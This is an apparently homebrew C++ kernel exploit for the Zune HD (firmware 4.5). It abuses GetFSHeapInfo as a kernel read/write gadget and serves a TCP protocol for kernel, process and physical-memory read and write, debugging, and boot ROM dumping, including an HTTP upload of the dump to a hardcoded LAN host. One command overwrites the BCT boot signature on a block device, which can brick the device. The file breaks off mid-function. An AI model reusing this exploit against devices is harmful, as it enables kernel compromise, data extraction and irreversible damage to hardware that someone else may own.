/* 
	ZuneSlayer HD

	Kernel Exploit for Zune HD (pavo) (offsets specific to fw v4.5)

	Shy Bairns Get Nowt
 */

#include <windows.h>
#include <string>
#include <stdlib.h>
#include <stdio.h>
#include "xutility.h"

#include <zdksystem.h>

// VirtualCopy not in OpenZDK headers, declare from WinCE API
extern "C" BOOL VirtualCopy(LPVOID lpvDest, LPVOID lpvSrc, DWORD cbSize, DWORD fdwProtect);
#ifndef PAGE_PHYSICAL
#define PAGE_PHYSICAL 0x00400000
#endif

#include <winsock2.h>
#include <wininet.h>
#include <Iphlpapi.h>
#include "protocol/pb_encode.h"
#include "protocol/pb_decode.h"
#include "protocol/msg.pb.h"

wchar_t foo[256];

typedef unsigned int u32;
typedef unsigned short u16;

typedef DWORD (*KFSH)(DWORD, DWORD, DWORD);
typedef HANDLE (*FFS)(void*);
typedef BOOL (*VCE)(DWORD, void*, HANDLE, DWORD, DWORD, DWORD);
typedef void* (*CSM)(DWORD, DWORD);

DWORD WINAPI thread_exit_with_value(void* x) {
	while(1) {
		ExitThread((DWORD)x);
	}
	return 0;
}

// Write `val` to `kptr`
static void kwr(DWORD kptr, DWORD val) {
	HANDLE t = CreateThread(NULL, 0, thread_exit_with_value, (void*)val, 0, NULL);
	Sleep(200);
	BOOL b = GetExitCodeThread(t, (DWORD*)kptr);
	
}

// Read byte from `kptr`
static DWORD kreadb(DWORD kptr) {
	HMODULE mh = GetModuleHandleW(L"coredll.dll");
	KFSH ghi = (KFSH) GetProcAddress(mh, L"GetFSHeapInfo");
	DWORD hi = ghi(kptr, 0, 0x1338);
	return hi;
}
static u32 kreadu32(u32 kptr) {
	u32 d = kreadb(kptr);
	u32 c = kreadb(kptr+1);
	u32 b = kreadb(kptr+2);
	u32 a = kreadb(kptr+3);
	return (a << 24) | (b << 16) | (c << 8) | d;
}
u16 kreadu16(u32 kptr) {
	u32 d = kreadb(kptr);
	u32 c = kreadb(kptr+1);
	return (c << 8) | d;
}

// Write byte `val` to `kptr`
static void kwriteb(DWORD kptr, BYTE val) {
	HMODULE mh = GetModuleHandleW(L"coredll.dll");
	KFSH ghi = (KFSH) GetProcAddress(mh, L"GetFSHeapInfo");
	ghi(kptr, (DWORD)val, 0x1337);
}

void kmemcpy(DWORD kptr, BYTE* buf, size_t len) {
	HMODULE mh = GetModuleHandleW(L"coredll.dll");
	KFSH ghi = (KFSH) GetProcAddress(mh, L"GetFSHeapInfo");
	for(size_t i = 0; i < len; i++) {
		ghi(kptr+i, (DWORD)buf[i], 0x1337);
	}
}

static bool dead = false;

static int safe_send(SOCKET client, unsigned char* out, uint32_t count) {
	uint32_t off = 0;
	int rem = count;
	while(true) {
		int send_res = send(client,(char*)&out[off], rem, 0);
		if(send_res == SOCKET_ERROR) {
			return 1;
		}
		rem -= send_res;
		off += send_res;
		if(rem <= 0) {
			return 0;
		}
		Sleep(100);
	}
}

#define INBUFSZ 1024
#define OBUFSZ 0x10000
#define RDFILESZ 0x400

static zunecom_CommandResp resp = zunecom_CommandResp_init_zero;

static LPCWSTR getIpAddress(){
	MIB_IPADDRTABLE  *pIPAddrTable;
	DWORD            dwSize = 0;
	DWORD            dwRetVal;
	pIPAddrTable = (MIB_IPADDRTABLE*) malloc( sizeof(MIB_IPADDRTABLE) );
	LPCWSTR result = TEXT("Starting...");

	// Retrieving struct size
	if (GetIpAddrTable(pIPAddrTable, &dwSize, 0) == ERROR_INSUFFICIENT_BUFFER) {
		free( pIPAddrTable );
		pIPAddrTable = (MIB_IPADDRTABLE *) malloc ( dwSize );
	}

	if ( (dwRetVal = GetIpAddrTable( pIPAddrTable, &dwSize, 0 )) != NO_ERROR ) { 
		result=TEXT("GetIpAddrTable call failed.");
	}else{
		 char buffer [128];
		 in_addr me;
		 me.S_un.S_addr = pIPAddrTable->table[0].dwAddr;
		 sprintf (buffer, "CodePug WebServer Started.\nhttp://%s\nBuild: " __DATE__ " " __TIME__ "\n", inet_ntoa(me));
		 result = MultiCharToUniChar(buffer);
	}
	free(pIPAddrTable);
	return result;
}

void connection(SOCKET client) {
	unsigned char* inbuf = (unsigned char*)calloc(INBUFSZ, 1);
	unsigned char* out = (unsigned char*)calloc(OBUFSZ, 1);

		char c[64];
		sprintf(c, "Helo2 %s %s\n", __DATE__, __TIME__);
		if (send(client,c,strlen(c),0) == SOCKET_ERROR){
			closesocket(client);
			return;
		}

		while(true) {
			memset(out, 0, OBUFSZ);
			

			int res = recv(client,(char*)inbuf,INBUFSZ,0);

			if (res == SOCKET_ERROR){
				closesocket(client);
				return;
			}

			// read
			if(inbuf[0] == 1) {
				u32 addr = ((u32)inbuf[1]) | ((u32)(inbuf[2] << 8)) | ((u32)(inbuf[3] << 16)) | ((u32)(inbuf[4] << 24));

				u32 val = kreadu32(addr);

				
				out[0] = 1;
				out[1] = val & 0xFF;
				out[2] = (val >> 8) & 0xFF;
				out[3] = (val >> 16) & 0xFF;
				out[4] = (val >> 24) & 0xFF;
				
				if (send(client,(char*)out,32,0) == SOCKET_ERROR){
					ZDKSystem_ShowMessageBox(L"Send fail", MESSAGEBOX_TYPE_OK);
					closesocket(client);
					break;
				}
			// kernel write
			} else if (inbuf[0] == 20) {
				u32 addr = ((u32)inbuf[1]) | ((u32)(inbuf[2] << 8)) | ((u32)(inbuf[3] << 16)) | ((u32)(inbuf[4] << 24));
				u32 val  = ((u32)inbuf[5]) | ((u32)(inbuf[6] << 8)) | ((u32)(inbuf[7] << 16)) | ((u32)(inbuf[8] << 24));
				kwr(addr, val);
				out[0] = 20;
				out[1] = 1;
				if (send(client,(char*)out,32,0) == SOCKET_ERROR){
					closesocket(client);
					break;
				}
			// Cmd 23: IROM dump via HTTP upload to PC
			// Reads IROM page-by-page and POSTs to httpserv on PC
			// Packet: [23]
			// Response: [23][status:1][http_status:4]
			} else if (inbuf[0] == 23) {
				out[0] = 23;

				HMODULE mh23 = GetModuleHandleW(L"coredll.dll");

				// Map IROM page 0 first to verify access
				kwr(0x80060da0, 0x80069de0);
				CSM csm23 = (CSM) GetProcAddress(mh23, L"GetFSHeapInfo");
				DWORD irom_map = (DWORD)csm23(0xFFF00000 >> 8, 1);
				kwr(0x80060da0, 0x80015020);
				KFSH ghi23 = (KFSH) GetProcAddress(mh23, L"GetFSHeapInfo");

				if (!irom_map) {
					out[1] = 0; // mapping failed
					if (safe_send(client, out, 32)) { closesocket(client); break; }
				} else {
					// Read 4KB from page 0
					unsigned char irom_buf[4096];
					for (u32 i = 0; i < 4096; i++) {
						irom_buf[i] = (unsigned char)ghi23(irom_map + i, 0, 0x1338);
					}

					// Upload via WinInet HTTP POST to PC
					HINTERNET hInet = InternetOpenW(L"ZuneSlayer", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
					if (!hInet) {
						out[1] = 2; // InternetOpen failed
						DWORD ie = GetLastError();
						out[2] = ie & 0xFF; out[3] = (ie>>8)&0xFF; out[4] = (ie>>16)&0xFF; out[5] = (ie>>24)&0xFF;
						if (safe_send(client, out, 32)) { closesocket(client); break; }
					} else {
						HINTERNET hConn = InternetConnectW(hInet, L"192.168.55.100", 8080,
							NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
						if (!hConn) {
							out[1] = 3; // InternetConnect failed
							DWORD ie = GetLastError();
							out[2] = ie & 0xFF; out[3] = (ie>>8)&0xFF; out[4] = (ie>>16)&0xFF; out[5] = (ie>>24)&0xFF;
							InternetCloseHandle(hInet);
							if (safe_send(client, out, 32)) { closesocket(client); break; }
						} else {
							HINTERNET hReq = HttpOpenRequestW(hConn, L"POST", L"/upload/irom.bin",
								NULL, NULL, NULL, 0, 0);
							if (!hReq) {
								out[1] = 4; // HttpOpenRequest failed
								DWORD ie = GetLastError();
								out[2] = ie & 0xFF; out[3] = (ie>>8)&0xFF; out[4] = (ie>>16)&0xFF; out[5] = (ie>>24)&0xFF;
								InternetCloseHandle(hConn);
								InternetCloseHandle(hInet);
								if (safe_send(client, out, 32)) { closesocket(client); break; }
							} else {
								LPCWSTR headers = L"Content-Type: application/octet-stream";
								BOOL sent = HttpSendRequestW(hReq, headers, -1, irom_buf, 4096);
								DWORD ie = GetLastError();

								out[1] = sent ? 1 : 5;
								out[2] = ie & 0xFF; out[3] = (ie>>8)&0xFF; out[4] = (ie>>16)&0xFF; out[5] = (ie>>24)&0xFF;

								InternetCloseHandle(hReq);
								InternetCloseHandle(hConn);
								InternetCloseHandle(hInet);
								if (safe_send(client, out, 32)) { closesocket(client); break; }
							}
						}
					}
				}

			// Cmd 22: Probe raw block devices and try to read/corrupt BCT
			// Packet: [22][subcmd:1]
			//   subcmd 0: enumerate block devices, try to read BCT
			//   subcmd 1: corrupt BCT (write zeros over ECEC signature)
			// Response: [22][status:1][data...]
			} else if (inbuf[0] == 22) {
				u32 subcmd = inbuf[1];
				out[0] = 22;

				// Try opening various block device names
				LPCWSTR dev_names[] = {
					L"ZAF1:", L"ZAF2:", L"ZAF3:",
					L"DSK1:", L"DSK2:", L"DSK3:",
					L"Store:", L"Part00:", L"Part01:",
						NULL
				};

				HANDLE hDev = INVALID_HANDLE_VALUE;
				u32 dev_idx = 0;

				DWORD tcp_access = (subcmd == 1) ? (GENERIC_READ | GENERIC_WRITE) : GENERIC_READ;
				for (int d = 0; dev_names[d] != NULL; d++) {
					HANDLE h = CreateFileW(dev_names[d],
						tcp_access, FILE_SHARE_READ, NULL,
						OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
					if (h != INVALID_HANDLE_VALUE) {
						// Found one! Try multiple read methods
						unsigned char sector[2048];
						DWORD bytesRead = 0;
						memset(sector, 0, sizeof(sector));

						// Method 1: ReadFile
						SetFilePointer(h, 0, NULL, FILE_BEGIN);
						BOOL ok = ReadFile(h, sector, 512, &bytesRead, NULL);

						// Method 2: DISK_IOCTL_GETINFO (0x70800) + IOCTL_DISK_READ (0x70004)
						if (bytesRead == 0) {
							struct { DWORD total; DWORD bps; DWORD cyl; DWORD heads; DWORD sec; DWORD flags; } di;
							memset(&di, 0, sizeof(di));
							DWORD ioret = 0;
							DeviceIoControl(h, 0x00070800, NULL, 0, &di, sizeof(di), &ioret, NULL);
							// Store geometry in out[16..27]
							*(u32*)&out[16] = di.total;
							*(u32*)&out[20] = di.bps;
							*(u32*)&out[24] = di.flags;

							// Try IOCTL_DISK_READ with SG_REQ
							u32 secsize = (di.bps > 0 && di.bps <= 2048) ? di.bps : 512;
							struct { DWORD start; DWORD num_sec; DWORD num_sg; DWORD status; DWORD callback;
							         DWORD sb_len; unsigned char* sb_buf; } sg;
							sg.start = 0; sg.num_sec = 1; sg.num_sg = 1; sg.status = 0; sg.callback = 0;
							sg.sb_len = secsize; sg.sb_buf = sector;
							ok = DeviceIoControl(h, 0x00070004, &sg, sizeof(sg), NULL, 0, &ioret, NULL);
							if (ok) bytesRead = secsize;
						}

						// Method 3: Custom IOCTL 0x70D00
						if (bytesRead == 0) {
							DWORD ioret = 0;
							ok = DeviceIoControl(h, 0x00070D00, NULL, 0, sector, 512, &ioret, NULL);
							if (ok && ioret > 0) bytesRead = ioret;
						}

						out[1] = 1; // found a device
						out[2] = d; // which device index
						out[3] = ok ? 1 : 0;
						out[4] = bytesRead & 0xFF;
						out[5] = (bytesRead >> 8) & 0xFF;

						// Check for ECEC in first 512 bytes
						u32 has_ecec = 0;
						u32 ecec_off = 0;
						for (u32 i = 0; i + 3 < bytesRead; i++) {
							if (sector[i] == 'E' && sector[i+1] == 'C' &&
								sector[i+2] == 'E' && sector[i+3] == 'C') {
								has_ecec = 1;
								ecec_off = i;
								break;
							}
						}
						out[6] = has_ecec;
						out[7] = ecec_off & 0xFF;
						out[8] = (ecec_off >> 8) & 0xFF;

						if (safe_send(client, out, 32)) { CloseHandle(h); closesocket(client); break; }
						// Send the 512-byte sector
						if (safe_send(client, sector, 512)) { CloseHandle(h); closesocket(client); break; }

						if (subcmd == 1 && has_ecec) {
							// Corrupt the BCT: overwrite ECEC with zeros
							sector[ecec_off] = 0;
							sector[ecec_off+1] = 0;
							sector[ecec_off+2] = 0;
							sector[ecec_off+3] = 0;

							SetFilePointer(h, 0, NULL, FILE_BEGIN);
							DWORD bytesWritten = 0;
							BOOL wok = WriteFile(h, sector, 512, &bytesWritten, NULL);
							DWORD werr = GetLastError();

							// Send write result
							unsigned char wres[32];
							memset(wres, 0, 32);
							wres[0] = 22;
							wres[1] = wok ? 0x10 : 0x11; // 0x10 = write ok, 0x11 = write fail
							wres[2] = bytesWritten & 0xFF;
							wres[3] = (bytesWritten >> 8) & 0xFF;
							wres[4] = werr & 0xFF;
							wres[5] = (werr >> 8) & 0xFF;
							wres[6] = (werr >> 16) & 0xFF;
							wres[7] = (werr >> 24) & 0xFF;
							if (safe_send(client, wres, 32)) { CloseHandle(h); closesocket(client); break; }
						}

						CloseHandle(h);
						hDev = h;
						dev_idx = d;
						break; // use first device that works
					}
				}

				if (hDev == INVALID_HANDLE_VALUE) {
					// No device found
					out[1] = 0; // no device
					DWORD lerr = GetLastError();
					out[2] = lerr & 0xFF;
					out[3] = (lerr >> 8) & 0xFF;
					out[4] = (lerr >> 16) & 0xFF;
					out[5] = (lerr >> 24) & 0xFF;
					if (safe_send(client, out, 32)) { closesocket(client); break; }
				}

			// Cmd 21: IROM full dump (64KB) -- page-by-page NKCreateStaticMapping
			// Maps each 4KB IROM page individually, reads and sends.
			// Packet:  [21]
			// Response: [21][1][pages_ok:1] then up to 64KB of data
			//   For each page: sends [page_status:1] then 4096 bytes if status=1
			} else if (inbuf[0] == 21) {
				HMODULE mh21 = GetModuleHandleW(L"coredll.dll");
				out[0] = 21;
				out[1] = 1;
				if (safe_send(client, out, 32)) { closesocket(client); break; }

				// Dump 16 pages (64KB) one page at a time
				for (u32 page = 0; page < 16; page++) {
					u32 page_phys = 0xFFF00000 + page * 0x1000;

					// Map this single page
					kwr(0x80060da0, 0x80069de0);
					CSM csm21 = (CSM) GetProcAddress(mh21, L"GetFSHeapInfo");
					DWORD page_map = (DWORD)csm21(page_phys >> 8, 1);
					kwr(0x80060da0, 0x80015020);
					KFSH ghi21 = (KFSH) GetProcAddress(mh21, L"GetFSHeapInfo");

					unsigned char pg_status[1];
					if (!page_map) {
						pg_status[0] = 0; // mapping failed for this page
						if (send(client, (char*)pg_status, 1, 0) == SOCKET_ERROR) { closesocket(client); break; }
						// Send 4KB of zeros as placeholder
						unsigned char zeros[256];
						memset(zeros, 0, 256);
						for (int z = 0; z < 16; z++) {
							if (send(client, (char*)zeros, 256, 0) == SOCKET_ERROR) { closesocket(client); break; }
						}
					} else {
						pg_status[0] = 1; // page mapped OK
						if (send(client, (char*)pg_status, 1, 0) == SOCKET_ERROR) { closesocket(client); break; }

						// Read 4KB in 256-byte chunks and send immediately
						u32 pfail = 0;
						for (u32 off = 0; off < 0x1000 && !pfail; off += 256) {
							unsigned char cb[256];
							for (u32 i = 0; i < 256; i++) {
								cb[i] = (unsigned char)ghi21(page_map + off + i, 0, 0x1338);
							}
							if (send(client, (char*)cb, 256, 0) == SOCKET_ERROR) {
								pfail = 1;
							}
						}
						if (pfail) { closesocket(client); break; }
					}
				}

			// openproc
			} else if (inbuf[0] == 2) {
				u32 id = ((u32)inbuf[1]) | ((u32)(inbuf[2] << 8)) | ((u32)(inbuf[3] << 16)) | ((u32)(inbuf[4] << 24));
				u32 val = (u32)OpenProcess(PROCESS_ALL_ACCESS, false, id);
				out[0] = 2;
				out[1] = val & 0xFF;
				out[2] = (val >> 8) & 0xFF;
				out[3] = (val >> 16) & 0xFF;
				out[4] = (val >> 24) & 0xFF;

				if (send(client,(char*)out,32,0) == SOCKET_ERROR){
					ZDKSystem_ShowMessageBox(L"Send fail", MESSAGEBOX_TYPE_OK);
					closesocket(client);
					break;
				}
				//rd
			} else if (inbuf[0] == 3) {
				u32 hdl = ((u32)inbuf[1]) | ((u32)(inbuf[2] << 8)) | ((u32)(inbuf[3] << 16)) | ((u32)(inbuf[4] << 24));
				u32 addr = ((u32)inbuf[5]) | ((u32)(inbuf[6] << 8)) | ((u32)(inbuf[7] << 16)) | ((u32)(inbuf[8] << 24));
				
				DWORD val=0;
				DWORD tmp=0;
				BOOL ret = ReadProcessMemory((HANDLE)hdl, (void*)addr, &tmp, 4, &val);
				DWORD err = GetLastError();

				out[0] = 3;
				out[1] = tmp & 0xFF;
				out[2] = (tmp >> 8) & 0xFF;
				out[3] = (tmp >> 16) & 0xFF;
				out[4] = (tmp >> 24) & 0xFF;
				out[5] = val & 0xFF;
				out[6] = (val>> 8) & 0xFF;
				out[7] = (val >> 16) & 0xFF;
				out[8] = (val >> 24) & 0xFF;
				out[9] = (ret) & 0xFF;
				out[10] = err & 0xFF;
				out[11] = (err>> 8) & 0xFF;
				out[12] = (err >> 16) & 0xFF;
				out[13] = (err >> 24) & 0xFF;

				if (send(client,(char*)out,32,0) == SOCKET_ERROR){
					ZDKSystem_ShowMessageBox(L"Send fail", MESSAGEBOX_TYPE_OK);
					closesocket(client);
					break;
				}

				// proc w
} else if (inbuf[0] == 4) {
				u32 hdl = ((u32)inbuf[1]) | ((u32)(inbuf[2] << 8)) | ((u32)(inbuf[3] << 16)) | ((u32)(inbuf[4] << 24));
				u32 addr = ((u32)inbuf[5]) | ((u32)(inbuf[6] << 8)) | ((u32)(inbuf[7] << 16)) | ((u32)(inbuf[8] << 24));
				u32 val = ((u32)inbuf[9]) | ((u32)(inbuf[10] << 8)) | ((u32)(inbuf[11] << 16)) | ((u32)(inbuf[12] << 24));
				
				DWORD tmp=0;
				
				BOOL ret = WriteProcessMemory((HANDLE)hdl, (void*)addr, &val, 4, &tmp);
				DWORD err = GetLastError();

				out[0] = 4;
				out[1] = tmp & 0xFF;
				out[2] = (tmp >> 8) & 0xFF;
				out[3] = (tmp >> 16) & 0xFF;
				out[4] = (tmp >> 24) & 0xFF;
				out[5] = (ret) & 0xFF;
				out[6] = err & 0xFF;
				out[7] = (err>> 8) & 0xFF;
				out[8] = (err >> 16) & 0xFF;
				out[9] = (err >> 24) & 0xFF;

				if (send(client,(char*)out,32,0) == SOCKET_ERROR){
					ZDKSystem_ShowMessageBox(L"Send fail", MESSAGEBOX_TYPE_OK);
					closesocket(client);
					break;
				}

			} else if (inbuf[0] == 5) {
				u32 id = ((u32)inbuf[1]) | ((u32)(inbuf[2] << 8)) | ((u32)(inbuf[3] << 16)) | ((u32)(inbuf[4] << 24));
				BOOL val = DebugActiveProcess(id);

				out[0] = 5;
				out[1] = val & 0xFF;
				out[2] = (val >> 8) & 0xFF;
				out[3] = (val >> 16) & 0xFF;
				out[4] = (val >> 24) & 0xFF;

				if (send(client,(char*)out,32,0) == SOCKET_ERROR){
					ZDKSystem_ShowMessageBox(L"Send fail", MESSAGEBOX_TYPE_OK);
					closesocket(client);
					break;
				}

} else if (inbuf[0] == 6) {
				DEBUG_EVENT evt;
				BOOL val = WaitForDebugEvent(&evt, 0);

				u32 tmp = evt.dwDebugEventCode;

				out[0] = 6;
				out[1] = val & 0xFF;
				out[2] = (val >> 8) & 0xFF;
				out[3] = (val >> 16) & 0xFF;
				out[4] = (val >> 24) & 0xFF;
				out[5] = tmp & 0xFF;
				out[6] = (tmp >> 8) & 0xFF;
				out[7] = (tmp >> 16) & 0xFF;
				out[8] = (tmp >> 24) & 0xFF;

				u32 tmp1=0;

				if(val) {

					tmp1 = evt.dwProcessId;
					out[9] = tmp1 & 0xFF;
					out[10] = (tmp1 >> 8) & 0xFF;
					out[11] = (tmp1 >> 16) & 0xFF;
					out[12] = (tmp1 >> 24) & 0xFF;
					
					tmp1 = evt.dwThreadId;
					out[13] = tmp1 & 0xFF;
					out[14] = (tmp1 >> 8) & 0xFF;
					out[15] = (tmp1 >> 16) & 0xFF;
					out[16] = (tmp1 >> 24) & 0xFF;


					switch (tmp) {
						case EXCEPTION_DEBUG_EVENT:							
							tmp1 = evt.u.Exception.ExceptionRecord.ExceptionCode;
							out[17] = tmp1 & 0xFF;
							out[18] = (tmp1 >> 8) & 0xFF;
							out[19] = (tmp1 >> 16) & 0xFF;
							out[20] = (tmp1 >> 24) & 0xFF;

							break;
						//default:
						//	ContinueDebugEvent(evt.dwProcessId, evt.dwThreadId, DBG_CONTINUE);
					}
				}



				

				if (send(client,(char*)out,32,0) == SOCKET_ERROR){
					ZDKSystem_ShowMessageBox(L"Send fail", MESSAGEBOX_TYPE_OK);
					closesocket(client);
					break;
				}
} else if (inbuf[0] == 7) {
				u32 dwProcessId = ((u32)inbuf[1]) | ((u32)(inbuf[2] << 8)) | ((u32)(inbuf[3] << 16)) | ((u32)(inbuf[4] << 24));
				u32 dwThreadId = ((u32)inbuf[5]) | ((u32)(inbuf[6] << 8)) | ((u32)(inbuf[7] << 16)) | ((u32)(inbuf[8] << 24));
				
				ContinueDebugEvent(dwProcessId, dwThreadId, DBG_CONTINUE);

				out[0] = 7;

				if (send(client,(char*)out,32,0) == SOCKET_ERROR){
					ZDKSystem_ShowMessageBox(L"Send fail", MESSAGEBOX_TYPE_OK);
					closesocket(client);
					break;
				}
} else if (inbuf[0] == 8) {
				u32 dwThreadId = ((u32)inbuf[1]) | ((u32)(inbuf[2] << 8)) | ((u32)(inbuf[3] << 16)) | ((u32)(inbuf[4] << 24));
			//	u32 dwThreadId = ((u32)inbuf[5]) | ((u32)(inbuf[6] << 8)) | ((u32)(inbuf[7] << 16)) | ((u32)(inbuf[8] << 24));
							
				CONTEXT ctx = {0};
				ctx.ContextFlags = CONTEXT_FULL;
				HANDLE h = OpenThread(THREAD_GET_CONTEXT | THREAD_SET_CONTEXT, false, dwThreadId);
				GetThreadContext(h, &ctx);

				int i = 0;
				out[i++] = 8;
				u32 val = ctx.R0;
				out[i++] =  val & 0xFF;
				out[i++] = (val >> 8) & 0xFF;
				out[i++] = (val >> 16) & 0xFF;
				out[i++] = (val >> 24) & 0xFF;
				val = ctx.R1;
				out[i++] =  val & 0xFF;
				out[i++] = (val >> 8) & 0xFF;
				out[i++] = (val >> 16) & 0xFF;
				out[i++] = (val >> 24) & 0xFF;
				val = ctx.R2;	
				out[i++] =  val & 0xFF;
				out[i++] = (val >> 8) & 0xFF;
				out[i++] = (val >> 16) & 0xFF;
				out[i++] = (val >> 24) & 0xFF;
				val = ctx.R3;	
				out[i++] =  val & 0xFF;
				out[i++] = (val >> 8) & 0xFF;
				out[i++] = (val >> 16) & 0xFF;
				out[i++] = (val >> 24) & 0xFF;
				val = ctx.Pc;	
				out[i++] =  val & 0xFF;
				out[i++] = (val >> 8) & 0xFF;
				out[i++] = (val >> 16) & 0xFF;
				out[i++] = (val >> 24) & 0xFF;
				val = ctx.Lr;	
				out[i++] =  val & 0xFF;
				out[i++] = (val >> 8) & 0xFF;
				out[i++] = (val >> 16) & 0xFF;
				out[i++] = (val >> 24) & 0xFF;
				val = ctx.Sp;	
				out[i++] =  val & 0xFF;
				out[i++] = (val >> 8) & 0xFF;
				out[i++] = (val >> 16) & 0xFF;
				out[i++] = (val >> 24) & 0xFF;

				CloseHandle(h);
				

				if (send(client,(char*)out,64,0) == SOCKET_ERROR){
					ZDKSystem_ShowMessageBox(L"Send fail", MESSAGEBOX_TYPE_OK);
					closesocket(client);
					break;
				}


				// quit
			} else if (inbuf[0] == 10) {
				out[0] = 10;
				if (send(client,(char*)out,32,0) == SOCKET_ERROR){
					closesocket(client);
					break;
				}
				closesocket(client);
				// kill
			} else if (inbuf[0] == 11) {
				out[0] = 10;
				if (send(client,(char*)out,32,0) == SOCKET_ERROR){
					closesocket(client);
				}
				closesocket(client);
				dead = true;
				break;

// Cmd 17: Physical I/O read via NKCreateStaticMapping + kernel R/W gadget
// Same technique as cmd 15 but for reading hardware registers
// Packet: [17][phys_addr:4][offset:4][count:4] (count in bytes, max 1024)
// Response: [17][1][data:count] or [17][0][err:4]
} else if (inbuf[0] == 17) {
	u32 phys_addr = ((u32)inbuf[1]) | ((u32)(inbuf[2] << 8)) | ((u32)(inbuf[3] << 16)) | ((u32)(inbuf[4] << 24));
	u32 io_offset = ((u32)inbuf[5]) | ((u32)(inbuf[6] << 8)) | ((u32)(inbuf[7] << 16)) | ((u32)(inbuf[8] << 24));
	u32 count     = ((u32)inbuf[9]) | ((u32)(inbuf[10] << 8)) | ((u32)(inbuf[11] << 16)) | ((u32)(inbuf[12] << 24));
	if (count > 1024) count = 1024;

	HMODULE mh = GetModuleHandleW(L"coredll.dll");

	// Map the physical page(s) containing phys_addr + io_offset .. + io_offset + count
	u32 abs_addr  = phys_addr + io_offset;
	u32 map_phys  = abs_addr & 0xFFFFF000;            // page-align down
	u32 map_off   = abs_addr & 0xFFF;                 // offset within first page
	u32 end_addr  = abs_addr + count;
	u32 num_pages = ((end_addr - map_phys) + 0xFFF) >> 12;  // pages needed
	if (num_pages == 0) num_pages = 1;

	// Redirect GetFSHeapInfo -> NKCreateStaticMapping
	kwr(0x80060da0, 0x80069de0);
	CSM csm = (CSM) GetProcAddress(mh, L"GetFSHeapInfo");
	SetLastError(0);
	DWORD mapped = (DWORD)csm(map_phys >> 8, num_pages);
	DWORD err = GetLastError();

	// Restore GetFSHeapInfo -> R/W gadget
	kwr(0x80060da0, 0x80015020);
	KFSH ghi = (KFSH) GetProcAddress(mh, L"GetFSHeapInfo");

	// Always send 32-byte status first
	out[0] = 17;
	out[1] = mapped ? 1 : 0;
	out[2] = mapped & 0xFF;
	out[3] = (mapped >> 8) & 0xFF;
	out[4] = (mapped >> 16) & 0xFF;
	out[5] = (mapped >> 24) & 0xFF;
	out[6] = err & 0xFF;
	out[7] = (err >> 8) & 0xFF;
	out[8] = (err >> 16) & 0xFF;
	out[9] = (err >> 24) & 0xFF;
	if (safe_send(client, out, 32)) { closesocket(client); break; }

	// Then stream data if mapping succeeded
	if (mapped) {
		unsigned char* dbuf = (unsigned char*)calloc(count, 1);
		for (u32 i = 0; i < count; i++) {
			dbuf[i] = (unsigned char)ghi(mapped + map_off + i, 0, 0x1338);
		}
		if (safe_send(client, dbuf, count)) { free(dbuf); closesocket(client); break; }
		free(dbuf);
	}

// Cmd 18: Physical I/O write via NKCreateStaticMapping + kernel write
// Packet: [18][phys_addr:4][offset:4][val:4]
// Response: [18][ok:1]
} else if (inbuf[0] == 18) {
	u32 phys_addr = ((u32)inbuf[1]) | ((u32)(inbuf[2] << 8)) | ((u32)(inbuf[3] << 16)) | ((u32)(inbuf[4] << 24));
	u32 io_offset = ((u32)inbuf[5]) | ((u32)(inbuf[6] << 8)) | ((u32)(inbuf[7] << 16)) | ((u32)(inbuf[8] << 24));
	u32 val       = ((u32)inbuf[9]) | ((u32)(inbuf[10] << 8)) | ((u32)(inbuf[11] << 16)) | ((u32)(inbuf[12] << 24));

	HMODULE mh = GetModuleHandleW(L"coredll.dll");
	kwr(0x80060da0, 0x80069de0);
	CSM csm = (CSM) GetProcAddress(mh, L"GetFSHeapInfo");
	DWORD mapped = (DWORD)csm(phys_addr >> 8, 0x10000);
	kwr(0x80060da0, 0x80015020);

	out[0] = 18;
	if (mapped) {
		kwr(mapped + io_offset, val);
		out[1] = 1;
	} else {
		out[1] = 0;
	}
	if (safe_send(client, out, 32)) { closesocket(client); break; }

// Cmd 19: Physical I/O read via VirtualCopy (user-mode MMIO mapping)
// Packet: [19][phys_addr:4][offset:4][count:4]
// Response: [19][ok:1][data:count] or [19][0][err:4]
} else if (inbuf[0] == 19) {
	u32 phys_addr = ((u32)inbuf[1]) | ((u32)(inbuf[2] << 8)) | ((u32)(inbuf[3] << 16)) | ((u32)(inbuf[4] << 24));
	u32 io_offset = ((u32)inbuf[5]) | ((u32)(inbuf[6] << 8)) | ((u32)(inbuf[7] << 16)) | ((u32)(inbuf[8] << 24));
	u32 count     = ((u32)inbuf[9]) | ((u32)(inbuf[10] << 8)) | ((u32)(inbuf[11] << 16)) | ((u32)(inbuf[12] << 24));
	if (count > 4096) count = 4096;

	// Calculate page-aligned physical address
	u32 abs_addr  = phys_addr + io_offset;
	u32 page_base = abs_addr & 0xFFFFF000;
	u32 page_off  = abs_addr & 0xFFF;
	u32 map_size  = ((page_off + count) + 0xFFF) & 0xFFFFF000; // round up to page

	// Reserve VA range
	void* vbase = VirtualAlloc(NULL, map_size, MEM_RESERVE, PAGE_NOACCESS);
	SetLastError(0);
	DWORD err = 0;
	BOOL ok = FALSE;

	if (vbase) {
		// Map physical address into our process space
		// PAGE_PHYSICAL tells VirtualCopy the source is a physical address (shifted right by 8)
		// PAGE_READWRITE | PAGE_NOCACHE for uncached MMIO access
		ok = VirtualCopy(vbase, (LPVOID)(page_base >> 8), map_size,
			PAGE_READWRITE | PAGE_NOCACHE | PAGE_PHYSICAL);
		err = GetLastError();
	} else {
		err = GetLastError();
	}

	out[0] = 19;
	out[1] = (vbase && ok) ? 1 : 0;
	out[2] = err & 0xFF;
	out[3] = (err >> 8) & 0xFF;
	out[4] = (err >> 16) & 0xFF;
	out[5] = (err >> 24) & 0xFF;
	// Store mapped VA for debugging
	u32 mapped_va = (u32)vbase;
	out[6] = mapped_va & 0xFF;
	out[7] = (mapped_va >> 8) & 0xFF;
	out[8] = (mapped_va >> 16) & 0xFF;
	out[9] = (mapped_va >> 24) & 0xFF;
	if (safe_send(client, out, 32)) { if (vbase) VirtualFree(vbase, 0, MEM_RELEASE); closesocket(client); break; }

	if (vbase && ok) {
		// Read data from mapped region
		unsigned char* dbuf = (unsigned char*)calloc(count, 1);
		unsigned char* src = ((unsigned char*)vbase) + page_off;
		// Use volatile to prevent optimizer from caching reads
		for (u32 i = 0; i < count; i++) {
			dbuf[i] = ((volatile unsigned char*)src)[i];
		}
		if (safe_send(client, dbuf, count)) { free(dbuf); VirtualFree(vbase, 0, MEM_RELEASE); closesocket(client); break; }
		free(dbuf);
	}

	// Cleanup
